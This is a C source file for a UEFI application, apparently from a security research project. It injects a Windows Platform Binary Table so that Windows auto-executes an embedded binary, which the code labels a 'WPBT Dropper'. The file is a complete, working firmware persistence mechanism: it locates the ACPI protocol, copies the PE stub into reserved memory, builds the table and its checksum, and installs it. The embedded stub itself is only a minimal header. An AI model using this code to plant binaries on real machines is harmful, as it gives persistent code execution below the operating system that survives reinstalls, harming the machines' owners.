#include "../../uefi-preboot/include/uefi.h"
#include "wpbt_table.h"

// EFI ACPI Table Protocol GUID
#define EFI_ACPI_TABLE_PROTOCOL_GUID \
    { 0xffe062f5, 0x8ae7, 0x42e1, { 0xac, 0x8a, 0xcb, 0x76, 0x47, 0x82, 0x51, 0x80 } }

typedef struct _EFI_ACPI_TABLE_PROTOCOL {
    EFI_STATUS (EFIAPI *InstallAcpiTable)(
        struct _EFI_ACPI_TABLE_PROTOCOL *This,
        VOID                            *AcpiTableBuffer,
        UINTN                           AcpiTableBufferSize,
        UINTN                           *TableKey
    );
    EFI_STATUS (EFIAPI *UninstallAcpiTable)(
        struct _EFI_ACPI_TABLE_PROTOCOL *This,
        UINTN                           TableKey
    );
} EFI_ACPI_TABLE_PROTOCOL;

static EFI_GUID gAcpiTableProtocolGuid = EFI_ACPI_TABLE_PROTOCOL_GUID;

// Embedded minimalist WPBT Dropper stub (PE Executable signature: "MZ" + "PE\0\0")
static const uint8_t gSampleWpbbinPayload[] = {
    0x4D, 0x5A, 0x90, 0x00, 0x03, 0x00, 0x00, 0x00, 0x04, 0x00, 0x00, 0x00, 0xFF, 0xFF, 0x00, 0x00,
    0xB8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x50, 0x45, 0x00, 0x00, 0x64, 0x86, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
};

EFI_STATUS EFIAPI EfiMain(EFI_HANDLE ImageHandle, EFI_SYSTEM_TABLE *SystemTable)
{
    EFI_BOOT_SERVICES *BS = SystemTable->BootServices;
    EFI_STATUS Status;

    if (SystemTable->ConOut) {
        SystemTable->ConOut->SetAttribute(SystemTable->ConOut, 0x0B); // Light Cyan
        SystemTable->ConOut->OutputString(SystemTable->ConOut, (CHAR16*)L"[ACPI WPBT] Initializing Windows Platform Binary Table Injection...\r\n");
    }

    // 1. Locate EFI ACPI Table Protocol
    EFI_ACPI_TABLE_PROTOCOL *AcpiProtocol = NULL;
    Status = BS->LocateProtocol(&gAcpiTableProtocolGuid, NULL, (VOID**)&AcpiProtocol);
    if (EFI_ERROR(Status) || !AcpiProtocol) {
        if (SystemTable->ConOut) {
            SystemTable->ConOut->SetAttribute(SystemTable->ConOut, 0x0C);
            SystemTable->ConOut->OutputString(SystemTable->ConOut, (CHAR16*)L"[ERROR] EFI_ACPI_TABLE_PROTOCOL not supported by motherboard firmware.\r\n");
        }
        return Status;
    }

    // 2. Allocate Physical ACPI Reclaim Memory for the Payload
    UINTN PayloadSize = sizeof(gSampleWpbbinPayload);
    UINTN PagesNeeded = (PayloadSize + 4095) / 4096;
    EFI_PHYSICAL_ADDRESS HandoffAddress = 0;

    Status = BS->AllocatePages(
        AllocateAnyPages,
        EfiACPIReclaimMemory,
        PagesNeeded,
        &HandoffAddress
    );

    if (EFI_ERROR(Status)) {
        if (SystemTable->ConOut) {
            SystemTable->ConOut->SetAttribute(SystemTable->ConOut, 0x0C);
            SystemTable->ConOut->OutputString(SystemTable->ConOut, (CHAR16*)L"[ERROR] Failed to allocate physical ACPI memory for WPBT payload.\r\n");
        }
        return Status;
    }

    // 3. Copy Payload into Physical ACPI Memory
    uint8_t *DestMem = (uint8_t*)(UINTN)HandoffAddress;
    for (UINTN i = 0; i < PayloadSize; i++) {
        DestMem[i] = gSampleWpbbinPayload[i];
    }

    // 4. Construct Microsoft ACPI WPBT Table
    ACPI_WPBT_TABLE WpbtTable;
    for (UINTN i = 0; i < sizeof(ACPI_WPBT_TABLE); i++) {
        ((uint8_t*)&WpbtTable)[i] = 0;
    }

    // ACPI Standard Header
    WpbtTable.Header.Signature = ACPI_WPBT_SIGNATURE; // 'WPBT'
    WpbtTable.Header.Length = sizeof(ACPI_WPBT_TABLE);
    WpbtTable.Header.Revision = 1;
    WpbtTable.Header.Checksum = 0;
    
    // OEM Identifiers
    WpbtTable.Header.OemId[0] = 'P'; WpbtTable.Header.OemId[1] = 'C';
    WpbtTable.Header.OemId[2] = 'L'; WpbtTable.Header.OemId[3] = 'O';
    WpbtTable.Header.OemId[4] = 'C'; WpbtTable.Header.OemId[5] = 'K';

    WpbtTable.Header.OemTableId[0] = 'C'; WpbtTable.Header.OemTableId[1] = 'Y';
    WpbtTable.Header.OemTableId[2] = 'B'; WpbtTable.Header.OemTableId[3] = 'E';
    WpbtTable.Header.OemTableId[4] = 'R'; WpbtTable.Header.OemTableId[5] = 'S';
    WpbtTable.Header.OemTableId[6] = 'E'; WpbtTable.Header.OemTableId[7] = 'C';

    WpbtTable.Header.OemRevision = 0x00000001;
    WpbtTable.Header.CreatorId = 0x4B4C4350; // 'PCLK'
    WpbtTable.Header.CreatorRevision = 0x00000001;

    // WPBT Specific Fields
    WpbtTable.HandoffMemorySize = (uint32_t)PayloadSize;
    WpbtTable.HandoffMemoryLocation = (uint64_t)HandoffAddress;
    WpbtTable.ContentLayout = 0; // PE Binary
    WpbtTable.ContentType = 1;   // Native Windows App
    WpbtTable.CommandLineLength = 0;
    WpbtTable.CommandLine[0] = 0;

    // Calculate Checksum
    WpbtTable.Header.Checksum = CalculateAcpiChecksum((const uint8_t*)&WpbtTable, sizeof(ACPI_WPBT_TABLE));

    // 5. Install WPBT Table into ACPI Subsystem
    UINTN TableKey = 0;
    Status = AcpiProtocol->InstallAcpiTable(
        AcpiProtocol,
        &WpbtTable,
        sizeof(ACPI_WPBT_TABLE),
        &TableKey
    );

    if (EFI_ERROR(Status)) {
        if (SystemTable->ConOut) {
            SystemTable->ConOut->SetAttribute(SystemTable->ConOut, 0x0C);
            SystemTable->ConOut->OutputString(SystemTable->ConOut, (CHAR16*)L"[ERROR] InstallAcpiTable failed.\r\n");
        }
        return Status;
    }

    if (SystemTable->ConOut) {
        SystemTable->ConOut->SetAttribute(SystemTable->ConOut, 0x0A); // Green
        SystemTable->ConOut->OutputString(SystemTable->ConOut, (CHAR16*)L"[SUCCESS] ACPI WPBT Table Registered in Motherboard ACPI Root!\r\n");
        SystemTable->ConOut->OutputString(SystemTable->ConOut, (CHAR16*)L"          Payload mapped at physical RAM. Windows Kernel will auto-execute wpbbin.exe.\r\n");
    }

    BS->Stall(2000000); // 2 sec
    return EFI_SUCCESS;
}
